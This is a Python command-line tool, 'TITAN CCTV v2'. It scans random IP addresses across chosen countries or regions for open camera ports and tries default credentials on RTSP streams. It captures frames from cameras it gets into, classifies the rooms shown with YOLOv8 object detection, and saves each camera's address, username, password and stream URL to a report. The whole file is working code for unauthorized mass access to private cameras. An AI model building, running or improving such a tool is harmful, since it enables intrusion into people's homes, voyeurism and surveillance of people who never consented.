#!/usr/bin/env python3
"""
TITAN CCTV v2 — UNIFIED SCANNER + REAL YOLO DETECTION ENGINE
Global RTSP camera discovery with live YOLOv8 object detection.

Usage:
    python titan_cctv.py scan --countries "Sri Lanka,India" --max-cams 50
    python titan_cctv.py scan --region south-asia --max-cams 100
    python titan_cctv.py scan --countries all --max-cams 200
    python titan_cctv.py scan --cidrs 112.134.0.0/16,220.247.0.0/17 --max-cams 20
    python titan_cctv.py probe --ip 112.134.55.10
    python titan_cctv.py yolo  --image /path/to/frame.jpg
    python titan_cctv.py list-countries
    python titan_cctv.py list-regions
"""

from __future__ import annotations

import argparse
import ipaddress
import json
import os
import random
import re
import shutil
import socket
import struct
import subprocess
import sys
import threading
import time
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

# ── local config ────────────────────────────────────────────
from cctv_config import (
    CREDENTIALS,
    GLOBAL_CIDRS,
    REGIONS,
    RTSP_PATHS,
    SCAN_PORTS,
    ROOM_CLASSIFICATION,
    YOLO_CLASSES,
    CAMERA_MANUFACTURERS,
    get_cidrs_for_countries,
    get_cidrs_for_region,
    list_available_countries,
    list_available_regions,
)

# ════════════════════════════════════════════════════════════
#  CONSTANTS
# ════════════════════════════════════════════════════════════

BASE_DIR = Path(__file__).resolve().parent
FRAME_DIR = BASE_DIR / "hunt_frames"
DATA_DIR = BASE_DIR / "data"
RESULTS_DIR = BASE_DIR / "results"
YOLO_MODEL = BASE_DIR.parent / "yolov8n.pt"

for d in (FRAME_DIR, DATA_DIR, RESULTS_DIR):
    d.mkdir(parents=True, exist_ok=True)


# ════════════════════════════════════════════════════════════
#  YOLO DETECTOR — real inference with ultralytics
# ════════════════════════════════════════════════════════════

_yolo_model = None
_yolo_lock = threading.Lock()


def _get_yolo():
    global _yolo_model
    if _yolo_model is None:
        with _yolo_lock:
            if _yolo_model is None:
                try:
                    from ultralytics import YOLO
                    model_path = str(YOLO_MODEL)
                    if not YOLO_MODEL.exists():
                        model_path = "yolov8n.pt"
                    _yolo_model = YOLO(model_path)
                    print(f"  [YOLO] Model loaded: {model_path}")
                except ImportError:
                    print("  [YOLO] ultralytics not installed — detection disabled")
                    return None
    return _yolo_model


def yolo_detect(image_path: str, conf: float = 0.35) -> dict:
    """Run YOLOv8 inference on a single image. Returns detection dict."""
    model = _get_yolo()
    if model is None:
        return {"detections": [], "room_type": "unknown", "error": "model_unavailable"}

    if not os.path.isfile(image_path):
        return {"detections": [], "room_type": "unknown", "error": "file_not_found"}

    try:
        results = model(image_path, conf=conf, verbose=False)
        detections = []
        for r in results:
            for box in r.boxes:
                cls_id = int(box.cls[0])
                label = YOLO_CLASSES.get(cls_id, f"class_{cls_id}")
                confidence = float(box.conf[0])
                x1, y1, x2, y2 = box.xyxy[0].tolist()
                detections.append({
                    "label": label,
                    "confidence": round(confidence, 3),
                    "bbox": [round(v, 1) for v in (x1, y1, x2, y2)],
                    "class_id": cls_id,
                })
        room = classify_room(detections)
        return {
            "detections": detections,
            "detection_count": len(detections),
            "room_type": room,
            "unique_objects": list({d["label"] for d in detections}),
        }
    except Exception as e:
        return {"detections": [], "room_type": "unknown", "error": str(e)}


def classify_room(detections: list[dict]) -> str:
    """Classify room type from YOLO detections."""
    if not detections:
        return "unknown"
    labels = {d["label"] for d in detections}
    scores: dict[str, float] = defaultdict(float)
    for room, indicators in ROOM_CLASSIFICATION.items():
        for lbl in labels:
            if lbl in indicators.get("strong", []):
                scores[room] += 3.0
            elif lbl in indicators.get("moderate", []):
                scores[room] += 1.5
            elif lbl in indicators.get("weak", []):
                scores[room] += 0.5
    if not scores:
        return "unknown"
    return max(scores, key=scores.get)


# ════════════════════════════════════════════════════════════
#  IP GENERATION
# ════════════════════════════════════════════════════════════

def generate_ips(cidrs: list[str], count: int = 500) -> list[str]:
    """Sample random IPs from a list of CIDRs (no host-part 0 or 255)."""
    ips: set[str] = set()
    # weight CIDRs proportionally to their size
    nets = []
    for c in cidrs:
        try:
            nets.append(ipaddress.ip_network(c, strict=False))
        except ValueError:
            continue
    if not nets:
        return []
    weights = [n.num_addresses for n in nets]
    total = sum(weights)
    attempts = 0
    while len(ips) < count and attempts < count * 20:
        attempts += 1
        net = random.choices(nets, weights=weights, k=1)[0]
        offset = random.randint(1, max(1, net.num_addresses - 2))
        ip = net.network_address + offset
        s = str(ip)
        # skip broadcast-looking
        if s.endswith(".0") or s.endswith(".255"):
            continue
        ips.add(s)
    return sorted(ips)


# ════════════════════════════════════════════════════════════
#  PORT SCANNER (pure socket — no masscan dependency)
# ════════════════════════════════════════════════════════════

def tcp_check(ip: str, port: int, timeout: float = 1.5) -> bool:
    """Quick TCP connect check."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.close()
        return True
    except (OSError, socket.timeout):
        return False


def scan_ip(ip: str, ports: list[int] | None = None) -> dict | None:
    """Scan a single IP for open camera ports. Returns dict or None."""
    ports = ports or [554, 8554, 80, 8080]
    open_ports = []
    for p in ports:
        if tcp_check(ip, p):
            open_ports.append(p)
    if open_ports:
        return {"ip": ip, "open_ports": open_ports}
    return None


def masscan_scan(cidrs: list[str], ports: list[int] | None = None,
                 rate: int = 50000, timeout: int = 120) -> list[str]:
    """Use masscan if available for fast scanning. Falls back to socket scan."""
    masscan_bin = shutil.which("masscan")
    if not masscan_bin:
        return []

    ports = ports or [554, 8554, 80, 8080]
    port_str = ",".join(str(p) for p in ports)
    cidr_file = str(DATA_DIR / "scan_cidrs.txt")
    result_file = str(DATA_DIR / "masscan_results.txt")

    with open(cidr_file, "w") as f:
        f.write("\n".join(cidrs))

    cmd = [
        masscan_bin, "-iL", cidr_file, "-p", port_str,
        "--rate", str(rate), "--open-only", "-oG", result_file,
    ]
    try:
        subprocess.run(cmd, capture_output=True, timeout=timeout, text=True)
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return []

    targets: list[str] = []
    if os.path.isfile(result_file):
        with open(result_file) as f:
            for line in f:
                m = re.search(r"Host:\s+(\d+\.\d+\.\d+\.\d+)", line)
                if m:
                    ip = m.group(1)
                    if ip not in targets:
                        targets.append(ip)
    return targets


# ════════════════════════════════════════════════════════════
#  RTSP PROBE
# ════════════════════════════════════════════════════════════

def probe_rtsp(ip: str, timeout: int = 4, max_cred_attempts: int = 5,
               max_path_attempts: int = 4) -> dict | None:
    """Try credentials × paths via ffmpeg to grab a frame. Returns hit dict."""
    # prioritise most common cred/path combos
    creds = CREDENTIALS[:max_cred_attempts]
    paths = RTSP_PATHS[:max_path_attempts]

    for user, passwd in creds:
        for rpath in paths:
            auth = f"{user}:{passwd}@" if passwd else f"{user}:@"
            rtsp_url = f"rtsp://{auth}{ip}:554{rpath}"
            frame_path = str(FRAME_DIR / f"frame_{ip.replace('.', '_')}.jpg")
            try:
                r = subprocess.run(
                    [
                        "ffmpeg", "-rtsp_transport", "tcp",
                        "-i", rtsp_url,
                        "-vframes", "1", "-f", "image2", "-y", frame_path,
                    ],
                    capture_output=True, timeout=timeout, text=True,
                )
                if r.returncode == 0 and os.path.isfile(frame_path) and os.path.getsize(frame_path) > 1000:
                    # parse stream info from ffmpeg stderr
                    resolution = _extract_resolution(r.stderr)
                    codec = _extract_codec(r.stderr)
                    return {
                        "ip": ip,
                        "user": user,
                        "password": passwd,
                        "rtsp_url": rtsp_url,
                        "rtsp_path": rpath,
                        "frame_file": frame_path,
                        "frame_size": os.path.getsize(frame_path),
                        "resolution": resolution,
                        "codec": codec,
                        "timestamp": datetime.now().isoformat(),
                    }
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass
            # clean up failed frame
            try:
                if os.path.isfile(frame_path) and os.path.getsize(frame_path) <= 1000:
                    os.remove(frame_path)
            except OSError:
                pass
    return None


def _extract_resolution(ffmpeg_stderr: str) -> str:
    m = re.search(r"(\d{2,5})x(\d{2,5})", ffmpeg_stderr)
    return f"{m.group(1)}x{m.group(2)}" if m else "unknown"


def _extract_codec(ffmpeg_stderr: str) -> str:
    for c in ("h264", "h265", "hevc", "mjpeg", "mpeg4"):
        if c in ffmpeg_stderr.lower():
            return c.upper().replace("HEVC", "H.265").replace("H264", "H.264")
    return "unknown"


# ════════════════════════════════════════════════════════════
#  FULL PIPELINE — scan → probe → yolo
# ════════════════════════════════════════════════════════════

def run_scan(
    countries: list[str] | None = None,
    region: str | None = None,
    cidrs_raw: list[str] | None = None,
    max_cams: int = 50,
    ips_to_generate: int = 2000,
    workers: int = 80,
    use_masscan: bool = True,
    run_yolo: bool = True,
    scan_ports: list[int] | None = None,
) -> dict:
    """Full scan pipeline: CIDR → IPs → port-scan → RTSP probe → YOLO."""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    scan_ports = scan_ports or [554, 8554, 80, 8080]

    # ── 1. resolve CIDRs ────────────────────────────────────
    cidrs: list[str] = []
    country_label = "custom"
    if cidrs_raw:
        cidrs = cidrs_raw
        country_label = "custom_cidrs"
    elif region:
        cidrs = get_cidrs_for_region(region)
        country_label = region
    elif countries:
        if countries == ["all"]:
            countries = list(GLOBAL_CIDRS.keys())
        cidrs = get_cidrs_for_countries(countries)
        country_label = "+".join(countries[:3])
        if len(countries) > 3:
            country_label += f"+{len(countries)-3}more"

    if not cidrs:
        print("[!] No CIDRs resolved. Check country/region names.")
        return {"error": "no_cidrs"}

    print(f"\n{'='*70}")
    print(f"  TITAN CCTV v2 — GLOBAL SCANNER + YOLO DETECTION")
    print(f"{'='*70}")
    print(f"  Target:  {country_label}")
    print(f"  CIDRs:   {len(cidrs)}")
    print(f"  Goal:    {max_cams} live cameras")
    print(f"  YOLO:    {'ON' if run_yolo else 'OFF'}")
    print(f"  Workers: {workers}")
    print(f"{'='*70}\n")

    # ── 2. phase 1: generate / masscan IPs ──────────────────
    print(f"[PHASE 1] Target acquisition — generating {ips_to_generate} IPs …")
    targets: list[str] = []

    if use_masscan and shutil.which("masscan"):
        print("  [masscan] Running fast port scan …")
        targets = masscan_scan(cidrs, ports=scan_ports, rate=50000)
        print(f"  [masscan] {len(targets)} hosts with open ports")

    if len(targets) < ips_to_generate:
        sampled = generate_ips(cidrs, count=ips_to_generate - len(targets))
        targets = list(dict.fromkeys(targets + sampled))  # dedupe, keep order
        print(f"  [sample] {len(sampled)} random IPs generated → total {len(targets)}")

    # ── 3. phase 2: socket port scan (if no masscan) ────────
    if not use_masscan or not shutil.which("masscan"):
        print(f"\n[PHASE 2] Port scanning {len(targets)} IPs (socket, {workers} threads) …")
        reachable: list[str] = []
        with ThreadPoolExecutor(max_workers=workers) as pool:
            futs = {pool.submit(scan_ip, ip, scan_ports): ip for ip in targets}
            for fut in as_completed(futs):
                try:
                    r = fut.result()
                    if r:
                        reachable.append(r["ip"])
                        if len(reachable) % 20 == 0:
                            print(f"    … {len(reachable)} reachable so far")
                except Exception:
                    pass
        targets = reachable
        print(f"  → {len(targets)} IPs with open camera ports")

    # ── 4. phase 3: RTSP probe ──────────────────────────────
    print(f"\n[PHASE 3] RTSP probing {len(targets)} IPs for live streams (goal: {max_cams}) …")
    streams: list[dict] = []
    probed = 0
    with ThreadPoolExecutor(max_workers=min(workers, 60)) as pool:
        futs = {pool.submit(probe_rtsp, ip): ip for ip in targets}
        for fut in as_completed(futs):
            probed += 1
            try:
                hit = fut.result()
                if hit:
                    streams.append(hit)
                    print(f"  [+] #{len(streams):>3}  {hit['ip']:>16}  "
                          f"{hit['user']}:{hit['password']}  {hit['resolution']}  "
                          f"{hit['frame_size']:,}B")
                    if len(streams) >= max_cams:
                        # cancel remaining futures
                        for f in futs:
                            f.cancel()
                        break
            except Exception:
                pass
            if probed % 100 == 0:
                print(f"    … probed {probed}/{len(targets)}, found {len(streams)}")

    print(f"\n  → {len(streams)} live cameras found")

    # ── 5. phase 4: YOLO detection ──────────────────────────
    yolo_results: list[dict] = []
    if run_yolo and streams:
        print(f"\n[PHASE 4] Running YOLOv8 object detection on {len(streams)} frames …")
        _get_yolo()  # preload
        for i, cam in enumerate(streams, 1):
            det = yolo_detect(cam["frame_file"])
            cam["yolo"] = det
            yolo_results.append(det)
            objs = ", ".join(det.get("unique_objects", [])[:6]) or "nothing"
            room = det.get("room_type", "?")
            print(f"  [{i:>3}/{len(streams)}] {cam['ip']:>16}  "
                  f"room={room:<12}  objects=[{objs}]")

    # ── 6. summary + save ───────────────────────────────────
    room_counts = defaultdict(int)
    for s in streams:
        rt = s.get("yolo", {}).get("room_type", "unknown")
        room_counts[rt] += 1

    report = {
        "scan_id": f"titan_cctv_{ts}",
        "timestamp": datetime.now().isoformat(),
        "target": country_label,
        "cidrs_used": len(cidrs),
        "ips_scanned": len(targets),
        "live_streams": len(streams),
        "yolo_enabled": run_yolo,
        "room_classification": dict(room_counts),
        "cameras": streams,
    }

    out_file = RESULTS_DIR / f"scan_{country_label.replace(' ', '_')}_{ts}.json"
    with open(out_file, "w") as f:
        json.dump(report, f, indent=2, default=str)

    print(f"\n{'='*70}")
    print(f"  SCAN COMPLETE")
    print(f"{'='*70}")
    print(f"  Live cameras found : {len(streams)}")
    print(f"  IPs scanned        : {len(targets)}")
    if run_yolo:
        print(f"  Room breakdown:")
        for room, cnt in sorted(room_counts.items(), key=lambda x: -x[1]):
            print(f"    {room:<16} : {cnt}")
    print(f"  Results saved      : {out_file}")
    print(f"{'='*70}\n")
    return report


# ════════════════════════════════════════════════════════════
#  CLI
# ════════════════════════════════════════════════════════════

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="titan_cctv",
        description="Titan CCTV v2 — Global Camera Scanner + YOLO Detection",
    )
    sub = p.add_subparsers(dest="command")

    # ── scan ────────────────────────────────────────────────
    sc = sub.add_parser("scan", help="Scan for cameras")
    sc.add_argument("--countries", type=str, default=None,
                    help='Comma-separated countries (or "all")')
    sc.add_argument("--region", type=str, default=None,
                    help="Region preset (south-asia, europe, all …)")
    sc.add_argument("--cidrs", type=str, default=None,
                    help="Comma-separated CIDRs to scan directly")
    sc.add_argument("--max-cams", type=int, default=50)
    sc.add_argument("--ips", type=int, default=2000,
                    help="Max IPs to generate/sample")
    sc.add_argument("--workers", type=int, default=80)
    sc.add_argument("--no-yolo", action="store_true")
    sc.add_argument("--no-masscan", action="store_true")

    # ── probe ───────────────────────────────────────────────
    pr = sub.add_parser("probe", help="Probe single IP for RTSP")
    pr.add_argument("--ip", required=True)

    # ── yolo ────────────────────────────────────────────────
    yl = sub.add_parser("yolo", help="Run YOLO on an image")
    yl.add_argument("--image", required=True)
    yl.add_argument("--conf", type=float, default=0.35)

    # ── list ────────────────────────────────────────────────
    sub.add_parser("list-countries", help="List all available countries")
    sub.add_parser("list-regions",   help="List all region presets")

    return p


def main():
    parser = build_parser()
    args = parser.parse_args()

    if args.command == "scan":
        countries = None
        if args.countries:
            raw = [c.strip() for c in args.countries.split(",")]
            countries = ["all"] if raw == ["all"] else raw
        cidrs_raw = None
        if args.cidrs:
            cidrs_raw = [c.strip() for c in args.cidrs.split(",")]
        run_scan(
            countries=countries,
            region=args.region,
            cidrs_raw=cidrs_raw,
            max_cams=args.max_cams,
            ips_to_generate=args.ips,
            workers=args.workers,
            run_yolo=not args.no_yolo,
            use_masscan=not args.no_masscan,
        )
    elif args.command == "probe":
        hit = probe_rtsp(args.ip)
        if hit:
            print(json.dumps(hit, indent=2, default=str))
            det = yolo_detect(hit["frame_file"])
            print(json.dumps(det, indent=2))
        else:
            print(f"[!] No RTSP stream found on {args.ip}")
    elif args.command == "yolo":
        det = yolo_detect(args.image, conf=args.conf)
        print(json.dumps(det, indent=2))
    elif args.command == "list-countries":
        for c in list_available_countries():
            n = len(GLOBAL_CIDRS[c])
            print(f"  {c:<22} ({n} CIDRs)")
    elif args.command == "list-regions":
        for r in list_available_regions():
            countries = REGIONS[r]
            print(f"  {r:<20} → {', '.join(countries[:5])}"
                  f"{'…' if len(countries)>5 else ''}")
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
